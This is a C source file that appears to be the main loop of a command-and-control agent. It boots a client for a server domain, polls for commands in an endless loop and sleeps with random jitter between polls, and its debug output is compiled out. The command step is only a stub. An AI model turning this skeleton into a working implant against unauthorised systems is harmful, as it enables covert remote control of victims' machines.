#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "lib/options.h"
#include "lib/client.h"
#include "lib/utils.h"

// https://stackoverflow.com/a/1941331
#ifdef DEBUG
#define Dprintf(fmt, args...) printf(fmt, ##args)
#else
#define Dprintf(fmt, args...)
#endif

int main()
{
    srand(time(NULL));

    struct Client *client = init_client();
    Dprintf("[d] booting agent for %s\n", client->domain);

    while (1)
    {
        poll(client);

        switch (client->status)
        {
        case Idle:
            // do nothing, we're idle
            break;

        case Command:
            Dprintf("[d] we have a command to execute!\n");
            break;

        case Error:
            Dprintf("[de] the server indicated an error occured, resetting");
            client->status = Idle;
            break;

        default:
            Dprintf("[de] something is wrong, client reached an unknown status");
            break;
        }

        Dprintf("[d] client status is: %d\n", client->status);
        jittered_sleep();
    }

    return 0;
}
